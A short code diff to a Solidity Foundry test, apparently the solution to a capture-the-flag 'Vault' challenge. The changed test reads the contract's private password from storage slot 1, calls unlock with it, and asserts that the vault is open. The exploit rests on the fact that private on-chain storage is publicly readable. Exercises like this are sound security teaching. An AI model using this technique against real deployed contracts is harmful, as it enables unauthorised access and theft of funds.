@@ -20,8 +20,9 @@ contract VaultTest is Test {
 
     function test_attack() public {
         vm.prank(attacker);
-        vm.load(address(vault), bytes32(uint256(1)));
-        assertTrue(vault.locked(), "false");
+        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
+        vault.unlock(password);
+        assertFalse(vault.locked(), "false");
 
     }
 }
